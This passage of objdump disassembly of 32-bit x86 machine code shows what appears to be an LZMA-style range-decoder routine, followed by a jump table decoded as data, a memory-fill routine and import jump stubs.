  406bba:	29 4d 68             	sub    %ecx,0x68(%ebp)
  406bbd:	29 4d 6c             	sub    %ecx,0x6c(%ebp)
  406bc0:	66 8b c8             	mov    %ax,%cx
  406bc3:	66 c1 e9 05          	shr    $0x5,%cx
  406bc7:	66 2b c1             	sub    %cx,%ax
  406bca:	66 89 06             	mov    %ax,(%esi)
  406bcd:	8d 5a 01             	lea    0x1(%edx),%ebx
  406bd0:	81 7d 68 00 00 00 01 	cmpl   $0x1000000,0x68(%ebp)
  406bd7:	89 5d 34             	mov    %ebx,0x34(%ebp)
  406bda:	73 a0                	jae    0x406b7c
  406bdc:	e9 76 ff ff ff       	jmp    0x406b57
  406be1:	83 7d 38 01          	cmpl   $0x1,0x38(%ebp)
  406be5:	75 16                	jne    0x406bfd
  406be7:	8b 45 40             	mov    0x40(%ebp),%eax
  406bea:	8d b4 42 98 01 00 00 	lea    0x198(%edx,%eax,2),%esi
  406bf1:	c7 45 f4 08 00 00 00 	movl   $0x8,-0xc(%ebp)
  406bf8:	e9 7d 03 00 00       	jmp    0x406f7a
  406bfd:	8b 45 54             	mov    0x54(%ebp),%eax
  406c00:	89 45 58             	mov    %eax,0x58(%ebp)
  406c03:	8b 45 50             	mov    0x50(%ebp),%eax
  406c06:	89 45 54             	mov    %eax,0x54(%ebp)
  406c09:	8b 45 4c             	mov    0x4c(%ebp),%eax
  406c0c:	89 45 50             	mov    %eax,0x50(%ebp)
  406c0f:	33 c0                	xor    %eax,%eax
  406c11:	83 7d 40 07          	cmpl   $0x7,0x40(%ebp)
  406c15:	c7 45 f8 16 00 00 00 	movl   $0x16,-0x8(%ebp)
  406c1c:	0f 9d c0             	setge  %al
  406c1f:	48                   	dec    %eax
  406c20:	83 e0 fd             	and    $0xfffffffd,%eax
  406c23:	83 c0 0a             	add    $0xa,%eax
  406c26:	89 45 40             	mov    %eax,0x40(%ebp)
  406c29:	8d 82 64 06 00 00    	lea    0x664(%edx),%eax
  406c2f:	89 45 20             	mov    %eax,0x20(%ebp)
  406c32:	8b 75 20             	mov    0x20(%ebp),%esi
  406c35:	c7 45 f4 12 00 00 00 	movl   $0x12,-0xc(%ebp)
  406c3c:	e9 39 03 00 00       	jmp    0x406f7a
  406c41:	83 7d 38 00          	cmpl   $0x0,0x38(%ebp)
  406c45:	8b 45 40             	mov    0x40(%ebp),%eax
  406c48:	75 18                	jne    0x406c62
  406c4a:	83 c0 0f             	add    $0xf,%eax
  406c4d:	c1 e0 04             	shl    $0x4,%eax
  406c50:	03 45 2c             	add    0x2c(%ebp),%eax
  406c53:	c7 45 f4 09 00 00 00 	movl   $0x9,-0xc(%ebp)
  406c5a:	8d 34 42             	lea    (%edx,%eax,2),%esi
  406c5d:	e9 18 03 00 00       	jmp    0x406f7a
  406c62:	8d b4 42 b0 01 00 00 	lea    0x1b0(%edx,%eax,2),%esi
  406c69:	c7 45 f4 0a 00 00 00 	movl   $0xa,-0xc(%ebp)
  406c70:	e9 05 03 00 00       	jmp    0x406f7a
  406c75:	83 7d 38 00          	cmpl   $0x0,0x38(%ebp)
  406c79:	0f 85 a8 00 00 00    	jne    0x406d27
  406c7f:	83 7d 18 00          	cmpl   $0x0,0x18(%ebp)
  406c83:	0f 84 f5 04 00 00    	je     0x40717e
  406c89:	33 c0                	xor    %eax,%eax
  406c8b:	83 7d 40 07          	cmpl   $0x7,0x40(%ebp)
  406c8f:	0f 9d c0             	setge  %al
  406c92:	8d 44 00 09          	lea    0x9(%eax,%eax,1),%eax
  406c96:	89 45 40             	mov    %eax,0x40(%ebp)
  406c99:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  406c9d:	0f 84 92 04 00 00    	je     0x407135
  406ca3:	8b 45 64             	mov    0x64(%ebp),%eax
  406ca6:	2b 45 4c             	sub    0x4c(%ebp),%eax
  406ca9:	3b 45 04             	cmp    0x4(%ebp),%eax
  406cac:	72 03                	jb     0x406cb1
  406cae:	03 45 04             	add    0x4(%ebp),%eax
  406cb1:	8b 55 70             	mov    0x70(%ebp),%edx
  406cb4:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  406cb7:	8b 45 64             	mov    0x64(%ebp),%eax
  406cba:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  406cbd:	40                   	inc    %eax
  406cbe:	33 d2                	xor    %edx,%edx
  406cc0:	f7 75 04             	divl   0x4(%ebp)
  406cc3:	ff 45 18             	incl   0x18(%ebp)
  406cc6:	8b 45 10             	mov    0x10(%ebp),%eax
  406cc9:	ff 45 10             	incl   0x10(%ebp)
  406ccc:	ff 4d 14             	decl   0x14(%ebp)
  406ccf:	88 4d 1c             	mov    %cl,0x1c(%ebp)
  406cd2:	88 08                	mov    %cl,(%eax)
  406cd4:	89 55 64             	mov    %edx,0x64(%ebp)
  406cd7:	c7 45 f0 02 00 00 00 	movl   $0x2,-0x10(%ebp)
  406cde:	e9 ea fa ff ff       	jmp    0x4067cd
  406ce3:	83 7d 38 00          	cmpl   $0x0,0x38(%ebp)
  406ce7:	75 05                	jne    0x406cee
  406ce9:	8b 45 50             	mov    0x50(%ebp),%eax
  406cec:	eb 30                	jmp    0x406d1e
  406cee:	8b 45 40             	mov    0x40(%ebp),%eax
  406cf1:	8d b4 42 c8 01 00 00 	lea    0x1c8(%edx,%eax,2),%esi
  406cf8:	c7 45 f4 0b 00 00 00 	movl   $0xb,-0xc(%ebp)
  406cff:	e9 76 02 00 00       	jmp    0x406f7a
  406d04:	83 7d 38 00          	cmpl   $0x0,0x38(%ebp)
  406d08:	75 05                	jne    0x406d0f
  406d0a:	8b 45 54             	mov    0x54(%ebp),%eax
  406d0d:	eb 09                	jmp    0x406d18
  406d0f:	8b 4d 54             	mov    0x54(%ebp),%ecx
  406d12:	8b 45 58             	mov    0x58(%ebp),%eax
  406d15:	89 4d 58             	mov    %ecx,0x58(%ebp)
  406d18:	8b 4d 50             	mov    0x50(%ebp),%ecx
  406d1b:	89 4d 54             	mov    %ecx,0x54(%ebp)
  406d1e:	8b 4d 4c             	mov    0x4c(%ebp),%ecx
  406d21:	89 4d 50             	mov    %ecx,0x50(%ebp)
  406d24:	89 45 4c             	mov    %eax,0x4c(%ebp)
  406d27:	8d 82 68 0a 00 00    	lea    0xa68(%edx),%eax
  406d2d:	89 45 20             	mov    %eax,0x20(%ebp)
  406d30:	c7 45 f8 15 00 00 00 	movl   $0x15,-0x8(%ebp)
  406d37:	e9 f6 fe ff ff       	jmp    0x406c32
  406d3c:	33 c0                	xor    %eax,%eax
  406d3e:	83 7d 40 07          	cmpl   $0x7,0x40(%ebp)
  406d42:	0f 9d c0             	setge  %al
  406d45:	48                   	dec    %eax
  406d46:	83 e0 fd             	and    $0xfffffffd,%eax
  406d49:	83 c0 0b             	add    $0xb,%eax
  406d4c:	89 45 40             	mov    %eax,0x40(%ebp)
  406d4f:	e9 96 01 00 00       	jmp    0x406eea
  406d54:	8b 45 48             	mov    0x48(%ebp),%eax
  406d57:	83 f8 04             	cmp    $0x4,%eax
  406d5a:	7c 03                	jl     0x406d5f
  406d5c:	6a 03                	push   $0x3
  406d5e:	58                   	pop    %eax
  406d5f:	c1 e0 07             	shl    $0x7,%eax
  406d62:	8d 84 10 60 03 00 00 	lea    0x360(%eax,%edx,1),%eax
  406d69:	89 45 20             	mov    %eax,0x20(%ebp)
  406d6c:	c7 45 38 06 00 00 00 	movl   $0x6,0x38(%ebp)
  406d73:	c7 45 fc 19 00 00 00 	movl   $0x19,-0x4(%ebp)
  406d7a:	e9 bf 02 00 00       	jmp    0x40703e
  406d7f:	83 fb 04             	cmp    $0x4,%ebx
  406d82:	7c 35                	jl     0x406db9
  406d84:	8b cb                	mov    %ebx,%ecx
  406d86:	8b c3                	mov    %ebx,%eax
  406d88:	83 e0 01             	and    $0x1,%eax
  406d8b:	d1 f9                	sar    $1,%ecx
  406d8d:	49                   	dec    %ecx
  406d8e:	83 c8 02             	or     $0x2,%eax
  406d91:	d3 e0                	shl    %cl,%eax
  406d93:	83 fb 0e             	cmp    $0xe,%ebx
  406d96:	89 45 4c             	mov    %eax,0x4c(%ebp)
  406d99:	7d 14                	jge    0x406daf
  406d9b:	2b c3                	sub    %ebx,%eax
  406d9d:	8d 84 42 5e 05 00 00 	lea    0x55e(%edx,%eax,2),%eax
  406da4:	89 45 20             	mov    %eax,0x20(%ebp)
  406da7:	89 4d 38             	mov    %ecx,0x38(%ebp)
  406daa:	e9 82 00 00 00       	jmp    0x406e31
  406daf:	33 db                	xor    %ebx,%ebx
  406db1:	83 c1 fc             	add    $0xfffffffc,%ecx
  406db4:	89 4d 30             	mov    %ecx,0x30(%ebp)
  406db7:	eb 33                	jmp    0x406dec
  406db9:	89 5d 4c             	mov    %ebx,0x4c(%ebp)
  406dbc:	e9 26 01 00 00       	jmp    0x406ee7
  406dc1:	8b 45 4c             	mov    0x4c(%ebp),%eax
  406dc4:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  406dc8:	0f 84 70 03 00 00    	je     0x40713e
  406dce:	8b 7d 08             	mov    0x8(%ebp),%edi
  406dd1:	8b 4d 6c             	mov    0x6c(%ebp),%ecx
  406dd4:	0f b6 3f             	movzbl (%edi),%edi
  406dd7:	c1 65 68 08          	shll   $0x8,0x68(%ebp)
  406ddb:	ff 4d 0c             	decl   0xc(%ebp)
  406dde:	c1 e1 08             	shl    $0x8,%ecx
  406de1:	0b cf                	or     %edi,%ecx
  406de3:	ff 45 08             	incl   0x8(%ebp)
  406de6:	89 4d 6c             	mov    %ecx,0x6c(%ebp)
  406de9:	ff 4d 30             	decl   0x30(%ebp)
  406dec:	83 7d 30 00          	cmpl   $0x0,0x30(%ebp)
  406df0:	7e 27                	jle    0x406e19
  406df2:	8b 4d 6c             	mov    0x6c(%ebp),%ecx
  406df5:	d1 6d 68             	shrl   $1,0x68(%ebp)
  406df8:	03 db                	add    %ebx,%ebx
  406dfa:	89 5d 34             	mov    %ebx,0x34(%ebp)
  406dfd:	3b 4d 68             	cmp    0x68(%ebp),%ecx
  406e00:	72 0c                	jb     0x406e0e
  406e02:	2b 4d 68             	sub    0x68(%ebp),%ecx
  406e05:	83 cb 01             	or     $0x1,%ebx
  406e08:	89 4d 6c             	mov    %ecx,0x6c(%ebp)
  406e0b:	89 5d 34             	mov    %ebx,0x34(%ebp)
  406e0e:	81 7d 68 00 00 00 01 	cmpl   $0x1000000,0x68(%ebp)
  406e15:	73 d2                	jae    0x406de9
  406e17:	eb ab                	jmp    0x406dc4
  406e19:	c1 e3 04             	shl    $0x4,%ebx
  406e1c:	03 c3                	add    %ebx,%eax
  406e1e:	81 c2 44 06 00 00    	add    $0x644,%edx
  406e24:	89 45 4c             	mov    %eax,0x4c(%ebp)
  406e27:	89 55 20             	mov    %edx,0x20(%ebp)
  406e2a:	c7 45 38 04 00 00 00 	movl   $0x4,0x38(%ebp)
  406e31:	33 db                	xor    %ebx,%ebx
  406e33:	c7 45 28 01 00 00 00 	movl   $0x1,0x28(%ebp)
  406e3a:	89 5d 34             	mov    %ebx,0x34(%ebp)
  406e3d:	89 5d 30             	mov    %ebx,0x30(%ebp)
  406e40:	eb 28                	jmp    0x406e6a
  406e42:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  406e46:	0f 84 fb 02 00 00    	je     0x407147
  406e4c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406e4f:	8b 45 6c             	mov    0x6c(%ebp),%eax
  406e52:	0f b6 09             	movzbl (%ecx),%ecx
  406e55:	c1 65 68 08          	shll   $0x8,0x68(%ebp)
  406e59:	ff 4d 0c             	decl   0xc(%ebp)
  406e5c:	c1 e0 08             	shl    $0x8,%eax
  406e5f:	0b c1                	or     %ecx,%eax
  406e61:	ff 45 08             	incl   0x8(%ebp)
  406e64:	89 45 6c             	mov    %eax,0x6c(%ebp)
  406e67:	ff 45 30             	incl   0x30(%ebp)
  406e6a:	8b 45 38             	mov    0x38(%ebp),%eax
  406e6d:	39 45 30             	cmp    %eax,0x30(%ebp)
  406e70:	7d 72                	jge    0x406ee4
  406e72:	8b 7d 28             	mov    0x28(%ebp),%edi
  406e75:	8b 45 20             	mov    0x20(%ebp),%eax
  406e78:	8b 55 68             	mov    0x68(%ebp),%edx
  406e7b:	03 ff                	add    %edi,%edi
  406e7d:	8d 34 07             	lea    (%edi,%eax,1),%esi
  406e80:	0f b7 06             	movzwl (%esi),%eax
  406e83:	0f b7 c8             	movzwl %ax,%ecx
  406e86:	c1 ea 0b             	shr    $0xb,%edx
  406e89:	0f af d1             	imul   %ecx,%edx
  406e8c:	89 75 24             	mov    %esi,0x24(%ebp)
  406e8f:	39 55 6c             	cmp    %edx,0x6c(%ebp)
  406e92:	73 17                	jae    0x406eab
  406e94:	89 55 68             	mov    %edx,0x68(%ebp)
  406e97:	ba 00 08 00 00       	mov    $0x800,%edx
  406e9c:	2b d1                	sub    %ecx,%edx
  406e9e:	c1 fa 05             	sar    $0x5,%edx
  406ea1:	03 d0                	add    %eax,%edx
  406ea3:	d1 65 28             	shll   $1,0x28(%ebp)
  406ea6:	66 89 16             	mov    %dx,(%esi)
  406ea9:	eb 2b                	jmp    0x406ed6
  406eab:	29 55 68             	sub    %edx,0x68(%ebp)
  406eae:	29 55 6c             	sub    %edx,0x6c(%ebp)
  406eb1:	33 c9                	xor    %ecx,%ecx
  406eb3:	41                   	inc    %ecx
  406eb4:	8b d9                	mov    %ecx,%ebx
  406eb6:	8b 4d 30             	mov    0x30(%ebp),%ecx
  406eb9:	d3 e3                	shl    %cl,%ebx
  406ebb:	8b cb                	mov    %ebx,%ecx
  406ebd:	8b 5d 34             	mov    0x34(%ebp),%ebx
  406ec0:	0b d9                	or     %ecx,%ebx
  406ec2:	66 8b c8             	mov    %ax,%cx
  406ec5:	66 c1 e9 05          	shr    $0x5,%cx
  406ec9:	66 2b c1             	sub    %cx,%ax
  406ecc:	47                   	inc    %edi
  406ecd:	89 5d 34             	mov    %ebx,0x34(%ebp)
  406ed0:	66 89 06             	mov    %ax,(%esi)
  406ed3:	89 7d 28             	mov    %edi,0x28(%ebp)
  406ed6:	81 7d 68 00 00 00 01 	cmpl   $0x1000000,0x68(%ebp)
  406edd:	73 88                	jae    0x406e67
  406edf:	e9 5e ff ff ff       	jmp    0x406e42
  406ee4:	01 5d 4c             	add    %ebx,0x4c(%ebp)
  406ee7:	ff 45 4c             	incl   0x4c(%ebp)
  406eea:	8b 45 4c             	mov    0x4c(%ebp),%eax
  406eed:	85 c0                	test   %eax,%eax
  406eef:	0f 84 5b 02 00 00    	je     0x407150
  406ef5:	3b 45 18             	cmp    0x18(%ebp),%eax
  406ef8:	0f 87 80 02 00 00    	ja     0x40717e
  406efe:	83 45 48 02          	addl   $0x2,0x48(%ebp)
  406f02:	8b 45 48             	mov    0x48(%ebp),%eax
  406f05:	01 45 18             	add    %eax,0x18(%ebp)
  406f08:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  406f0c:	0f 84 44 02 00 00    	je     0x407156
  406f12:	8b 45 64             	mov    0x64(%ebp),%eax
  406f15:	2b 45 4c             	sub    0x4c(%ebp),%eax
  406f18:	3b 45 04             	cmp    0x4(%ebp),%eax
  406f1b:	72 03                	jb     0x406f20
  406f1d:	03 45 04             	add    0x4(%ebp),%eax
  406f20:	8b 55 70             	mov    0x70(%ebp),%edx
  406f23:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  406f26:	8b 45 64             	mov    0x64(%ebp),%eax
  406f29:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  406f2c:	40                   	inc    %eax
  406f2d:	33 d2                	xor    %edx,%edx
  406f2f:	f7 75 04             	divl   0x4(%ebp)
  406f32:	8b 45 10             	mov    0x10(%ebp),%eax
  406f35:	ff 45 10             	incl   0x10(%ebp)
  406f38:	ff 4d 14             	decl   0x14(%ebp)
  406f3b:	ff 4d 48             	decl   0x48(%ebp)
  406f3e:	83 7d 48 00          	cmpl   $0x0,0x48(%ebp)
  406f42:	88 4d 1c             	mov    %cl,0x1c(%ebp)
  406f45:	88 08                	mov    %cl,(%eax)
  406f47:	89 55 64             	mov    %edx,0x64(%ebp)
  406f4a:	7f bc                	jg     0x406f08
  406f4c:	e9 86 fd ff ff       	jmp    0x406cd7
  406f51:	83 7d 38 00          	cmpl   $0x0,0x38(%ebp)
  406f55:	75 16                	jne    0x406f6d
  406f57:	8b 45 2c             	mov    0x2c(%ebp),%eax
  406f5a:	83 65 48 00          	andl   $0x0,0x48(%ebp)
  406f5e:	8b 4d 20             	mov    0x20(%ebp),%ecx
  406f61:	c1 e0 04             	shl    $0x4,%eax
  406f64:	8d 44 01 04          	lea    0x4(%ecx,%eax,1),%eax
  406f68:	e9 a9 00 00 00       	jmp    0x407016
  406f6d:	8b 75 20             	mov    0x20(%ebp),%esi
  406f70:	83 c6 02             	add    $0x2,%esi
  406f73:	c7 45 f4 13 00 00 00 	movl   $0x13,-0xc(%ebp)
  406f7a:	89 75 24             	mov    %esi,0x24(%ebp)
  406f7d:	0f b7 06             	movzwl (%esi),%eax
  406f80:	8b 4d 68             	mov    0x68(%ebp),%ecx
  406f83:	0f b7 f8             	movzwl %ax,%edi
  406f86:	c1 e9 0b             	shr    $0xb,%ecx
  406f89:	0f af cf             	imul   %edi,%ecx
  406f8c:	39 4d 6c             	cmp    %ecx,0x6c(%ebp)
  406f8f:	73 18                	jae    0x406fa9
  406f91:	89 4d 68             	mov    %ecx,0x68(%ebp)
  406f94:	b9 00 08 00 00       	mov    $0x800,%ecx
  406f99:	2b cf                	sub    %edi,%ecx
  406f9b:	c1 f9 05             	sar    $0x5,%ecx
  406f9e:	03 c8                	add    %eax,%ecx
  406fa0:	83 65 38 00          	andl   $0x0,0x38(%ebp)
  406fa4:	66 89 0e             	mov    %cx,(%esi)
  406fa7:	eb 1a                	jmp    0x406fc3
  406fa9:	29 4d 68             	sub    %ecx,0x68(%ebp)
  406fac:	29 4d 6c             	sub    %ecx,0x6c(%ebp)
  406faf:	66 8b c8             	mov    %ax,%cx
  406fb2:	66 c1 e9 05          	shr    $0x5,%cx
  406fb6:	66 2b c1             	sub    %cx,%ax
  406fb9:	66 89 06             	mov    %ax,(%esi)
  406fbc:	c7 45 38 01 00 00 00 	movl   $0x1,0x38(%ebp)
  406fc3:	81 7d 68 00 00 00 01 	cmpl   $0x1000000,0x68(%ebp)
  406fca:	73 25                	jae    0x406ff1
  406fcc:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  406fd0:	0f 84 89 01 00 00    	je     0x40715f
  406fd6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406fd9:	8b 45 6c             	mov    0x6c(%ebp),%eax
  406fdc:	0f b6 09             	movzbl (%ecx),%ecx
  406fdf:	c1 65 68 08          	shll   $0x8,0x68(%ebp)
  406fe3:	ff 4d 0c             	decl   0xc(%ebp)
  406fe6:	c1 e0 08             	shl    $0x8,%eax
  406fe9:	0b c1                	or     %ecx,%eax
  406feb:	ff 45 08             	incl   0x8(%ebp)
  406fee:	89 45 6c             	mov    %eax,0x6c(%ebp)
  406ff1:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406ff4:	e9 fe 00 00 00       	jmp    0x4070f7
  406ff9:	83 7d 38 00          	cmpl   $0x0,0x38(%ebp)
  406ffd:	75 23                	jne    0x407022
  406fff:	8b 45 2c             	mov    0x2c(%ebp),%eax
  407002:	8b 4d 20             	mov    0x20(%ebp),%ecx
  407005:	c1 e0 04             	shl    $0x4,%eax
  407008:	c7 45 48 08 00 00 00 	movl   $0x8,0x48(%ebp)
  40700f:	8d 84 01 04 01 00 00 	lea    0x104(%ecx,%eax,1),%eax
  407016:	89 45 20             	mov    %eax,0x20(%ebp)
  407019:	c7 45 38 03 00 00 00 	movl   $0x3,0x38(%ebp)
  407020:	eb 15                	jmp    0x407037
  407022:	81 45 20 04 02 00 00 	addl   $0x204,0x20(%ebp)
  407029:	c7 45 48 10 00 00 00 	movl   $0x10,0x48(%ebp)
  407030:	c7 45 38 08 00 00 00 	movl   $0x8,0x38(%ebp)
  407037:	c7 45 fc 14 00 00 00 	movl   $0x14,-0x4(%ebp)
  40703e:	8b 45 38             	mov    0x38(%ebp),%eax
  407041:	c7 45 28 01 00 00 00 	movl   $0x1,0x28(%ebp)
  407048:	89 45 30             	mov    %eax,0x30(%ebp)
  40704b:	eb 2b                	jmp    0x407078
  40704d:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  407051:	0f 84 11 01 00 00    	je     0x407168
  407057:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40705a:	8b 45 6c             	mov    0x6c(%ebp),%eax
  40705d:	0f b6 09             	movzbl (%ecx),%ecx
  407060:	c1 65 68 08          	shll   $0x8,0x68(%ebp)
  407064:	ff 4d 0c             	decl   0xc(%ebp)
  407067:	c1 e0 08             	shl    $0x8,%eax
  40706a:	0b c1                	or     %ecx,%eax
  40706c:	ff 45 08             	incl   0x8(%ebp)
  40706f:	89 45 6c             	mov    %eax,0x6c(%ebp)
  407072:	ff 4d 30             	decl   0x30(%ebp)
  407075:	8b 55 74             	mov    0x74(%ebp),%edx
  407078:	83 7d 30 00          	cmpl   $0x0,0x30(%ebp)
  40707c:	7e 5e                	jle    0x4070dc
  40707e:	8b 55 28             	mov    0x28(%ebp),%edx
  407081:	8b 45 20             	mov    0x20(%ebp),%eax
  407084:	8b 4d 68             	mov    0x68(%ebp),%ecx
  407087:	03 d2                	add    %edx,%edx
  407089:	8d 34 02             	lea    (%edx,%eax,1),%esi
  40708c:	0f b7 06             	movzwl (%esi),%eax
  40708f:	0f b7 f8             	movzwl %ax,%edi
  407092:	c1 e9 0b             	shr    $0xb,%ecx
  407095:	0f af cf             	imul   %edi,%ecx
  407098:	89 75 24             	mov    %esi,0x24(%ebp)
  40709b:	39 4d 6c             	cmp    %ecx,0x6c(%ebp)
  40709e:	73 17                	jae    0x4070b7
  4070a0:	89 4d 68             	mov    %ecx,0x68(%ebp)
  4070a3:	b9 00 08 00 00       	mov    $0x800,%ecx
  4070a8:	2b cf                	sub    %edi,%ecx
  4070aa:	c1 f9 05             	sar    $0x5,%ecx
  4070ad:	03 c8                	add    %eax,%ecx
  4070af:	d1 65 28             	shll   $1,0x28(%ebp)
  4070b2:	66 89 0e             	mov    %cx,(%esi)
  4070b5:	eb 17                	jmp    0x4070ce
  4070b7:	29 4d 68             	sub    %ecx,0x68(%ebp)
  4070ba:	29 4d 6c             	sub    %ecx,0x6c(%ebp)
  4070bd:	66 8b c8             	mov    %ax,%cx
  4070c0:	66 c1 e9 05          	shr    $0x5,%cx
  4070c4:	66 2b c1             	sub    %cx,%ax
  4070c7:	42                   	inc    %edx
  4070c8:	66 89 06             	mov    %ax,(%esi)
  4070cb:	89 55 28             	mov    %edx,0x28(%ebp)
  4070ce:	81 7d 68 00 00 00 01 	cmpl   $0x1000000,0x68(%ebp)
  4070d5:	73 9b                	jae    0x407072
  4070d7:	e9 71 ff ff ff       	jmp    0x40704d
  4070dc:	8b 4d 38             	mov    0x38(%ebp),%ecx
  4070df:	8b 5d 28             	mov    0x28(%ebp),%ebx
  4070e2:	33 c0                	xor    %eax,%eax
  4070e4:	40                   	inc    %eax
  4070e5:	d3 e0                	shl    %cl,%eax
  4070e7:	2b d8                	sub    %eax,%ebx
  4070e9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4070ec:	89 5d 34             	mov    %ebx,0x34(%ebp)
  4070ef:	eb 06                	jmp    0x4070f7
  4070f1:	01 5d 48             	add    %ebx,0x48(%ebp)
  4070f4:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4070f7:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4070fa:	e9 d1 f6 ff ff       	jmp    0x4067d0
  4070ff:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  407106:	eb 67                	jmp    0x40716f
  407108:	c7 45 f0 03 00 00 00 	movl   $0x3,-0x10(%ebp)
  40710f:	eb 5e                	jmp    0x40716f
  407111:	c7 45 f0 0d 00 00 00 	movl   $0xd,-0x10(%ebp)
  407118:	eb 55                	jmp    0x40716f
  40711a:	c7 45 f0 0e 00 00 00 	movl   $0xe,-0x10(%ebp)
  407121:	eb 4c                	jmp    0x40716f
  407123:	c7 45 f0 0f 00 00 00 	movl   $0xf,-0x10(%ebp)
  40712a:	eb 43                	jmp    0x40716f
  40712c:	c7 45 f0 1a 00 00 00 	movl   $0x1a,-0x10(%ebp)
  407133:	eb 3a                	jmp    0x40716f
  407135:	c7 45 f0 1b 00 00 00 	movl   $0x1b,-0x10(%ebp)
  40713c:	eb 31                	jmp    0x40716f
  40713e:	c7 45 f0 0c 00 00 00 	movl   $0xc,-0x10(%ebp)
  407145:	eb 28                	jmp    0x40716f
  407147:	c7 45 f0 10 00 00 00 	movl   $0x10,-0x10(%ebp)
  40714e:	eb 1f                	jmp    0x40716f
  407150:	83 4d 48 ff          	orl    $0xffffffff,0x48(%ebp)
  407154:	eb 19                	jmp    0x40716f
  407156:	c7 45 f0 1c 00 00 00 	movl   $0x1c,-0x10(%ebp)
  40715d:	eb 10                	jmp    0x40716f
  40715f:	c7 45 f0 05 00 00 00 	movl   $0x5,-0x10(%ebp)
  407166:	eb 07                	jmp    0x40716f
  407168:	c7 45 f0 18 00 00 00 	movl   $0x18,-0x10(%ebp)
  40716f:	8b 7d e8             	mov    -0x18(%ebp),%edi
  407172:	6a 22                	push   $0x22
  407174:	59                   	pop    %ecx
  407175:	8d 75 f0             	lea    -0x10(%ebp),%esi
  407178:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40717a:	33 c0                	xor    %eax,%eax
  40717c:	eb 03                	jmp    0x407181
  40717e:	83 c8 ff             	or     $0xffffffff,%eax
  407181:	5b                   	pop    %ebx
  407182:	5f                   	pop    %edi
  407183:	5e                   	pop    %esi
  407184:	83 c5 78             	add    $0x78,%ebp
  407187:	c9                   	leave
  407188:	c3                   	ret
  407189:	90                   	nop
  40718a:	e3 67                	jecxz  0x4071f3
  40718c:	40                   	inc    %eax
  40718d:	00 8b 68 40 00 27    	add    %cl,0x27004068(%ebx)
  407193:	69 40 00 f9 68 40 00 	imul   $0x4068f9,0x0(%eax),%eax
  40719a:	7d 6f                	jge    0x40720b
  40719c:	40                   	inc    %eax
  40719d:	00 cc                	add    %cl,%ah
  40719f:	6f                   	outsl  %ds:(%esi),(%dx)
  4071a0:	40                   	inc    %eax
  4071a1:	00 47 69             	add    %al,0x69(%edi)
  4071a4:	40                   	inc    %eax
  4071a5:	00 e1                	add    %ah,%cl
  4071a7:	6b 40 00 41          	imul   $0x41,0x0(%eax),%eax
  4071ab:	6c                   	insb   (%dx),%es:(%edi)
  4071ac:	40                   	inc    %eax
  4071ad:	00 75 6c             	add    %dh,0x6c(%ebp)
  4071b0:	40                   	inc    %eax
  4071b1:	00 e3                	add    %ah,%bl
  4071b3:	6c                   	insb   (%dx),%es:(%edi)
  4071b4:	40                   	inc    %eax
  4071b5:	00 04 6d 40 00 c1 6d 	add    %al,0x6dc10040(,%ebp,2)
  4071bc:	40                   	inc    %eax
  4071bd:	00 d8                	add    %bl,%al
  4071bf:	69 40 00 92 6a 40 00 	imul   $0x406a92,0x0(%eax),%eax
  4071c6:	57                   	push   %edi
  4071c7:	6b 40 00 42          	imul   $0x42,0x0(%eax),%eax
  4071cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4071cc:	40                   	inc    %eax
  4071cd:	00 32                	add    %dh,(%edx)
  4071cf:	6c                   	insb   (%dx),%es:(%edi)
  4071d0:	40                   	inc    %eax
  4071d1:	00 51 6f             	add    %dl,0x6f(%ecx)
  4071d4:	40                   	inc    %eax
  4071d5:	00 f9                	add    %bh,%cl
  4071d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4071d8:	40                   	inc    %eax
  4071d9:	00 f1                	add    %dh,%cl
  4071db:	70 40                	jo     0x40721d
  4071dd:	00 3c 6d 40 00 54 6d 	add    %bh,0x6d540040(,%ebp,2)
  4071e4:	40                   	inc    %eax
  4071e5:	00 3e                	add    %bh,(%esi)
  4071e7:	70 40                	jo     0x407229
  4071e9:	00 4d 70             	add    %cl,0x70(%ebp)
  4071ec:	40                   	inc    %eax
  4071ed:	00 7f 6d             	add    %bh,0x6d(%edi)
  4071f0:	40                   	inc    %eax
  4071f1:	00 26                	add    %ah,(%esi)
  4071f3:	6b 40 00 99          	imul   $0xffffff99,0x0(%eax),%eax
  4071f7:	6c                   	insb   (%dx),%es:(%edi)
  4071f8:	40                   	inc    %eax
  4071f9:	00 08                	add    %cl,(%eax)
  4071fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4071fc:	40                   	inc    %eax
  4071fd:	00 8b 4c 24 0c 85    	add    %cl,-0x7af3dbb4(%ebx)
  407203:	c9                   	leave
  407204:	76 23                	jbe    0x407229
  407206:	8a 44 24 08          	mov    0x8(%esp),%al
  40720a:	0f b6 c0             	movzbl %al,%eax
  40720d:	69 c0 01 01 01 01    	imul   $0x1010101,%eax,%eax
  407213:	8b d1                	mov    %ecx,%edx
  407215:	53                   	push   %ebx
  407216:	57                   	push   %edi
  407217:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  40721b:	c1 e9 02             	shr    $0x2,%ecx
  40721e:	f3 ab                	rep stos %eax,%es:(%edi)
  407220:	8b ca                	mov    %edx,%ecx
  407222:	83 e1 03             	and    $0x3,%ecx
  407225:	f3 aa                	rep stos %al,%es:(%edi)
  407227:	5f                   	pop    %edi
  407228:	5b                   	pop    %ebx
  407229:	8b 44 24 04          	mov    0x4(%esp),%eax
  40722d:	c3                   	ret
  40722e:	ff 25 a4 82 40 00    	jmp    *0x4082a4
  407234:	ff 25 a0 82 40 00    	jmp    *0x4082a0
